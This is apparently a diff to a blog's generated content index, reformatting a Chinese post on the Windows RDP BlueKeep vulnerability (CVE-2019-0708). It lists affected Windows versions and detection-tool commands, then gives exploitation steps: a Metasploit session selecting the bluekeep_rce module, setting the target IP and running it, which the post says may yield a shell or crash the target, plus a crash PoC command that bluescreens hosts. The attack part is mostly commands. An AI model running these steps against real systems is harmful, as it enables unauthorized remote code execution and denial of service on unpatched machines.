@@ -41,41 +41,27 @@
     <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
     <url>//cc781664c436.html</url>
     <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
-<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Windows 7</p>
-<p>Windows server 2008 R2</p>
-<p>Windows server 2008</p>
-<p>Windows 2003</p>
-<p>Windows xp</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
 <p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
 <h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
-<p>```</p>
-<p>pip install IPy</p>
-<p>cve-2019-0708_v1.py -t ip -p port -f file</p>
-<p>```</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
 <p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
-<p>```</p>
-<p>cve-2019-0708-scan.exe ip port</p>
-<p>```</p>
-<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><p>```</p>
-<p>root@root:~/桌面# msfconsole</p>
-<p>#打开MSF</p>
-<p>msf5 &gt; search cve_2019_0708</p>
-<p>#搜索cve_2019_0708的相关模块</p>
-<p>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</p>
-<p>#选择模块</p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show options</p>
-<p>#查看相关参数</p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</p>
-<p>#设置靶机ip</p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3</p>
-<p>#3代表目标机器架构为VMware、2代表目标架构是virtulbox</p>
-<p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; run</p>
-<p>```</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
+
 <p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
-<p>```</p>
-<p>pip install impacket</p>
-<p>crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</p>
-<p>```</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
 <p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
 
 
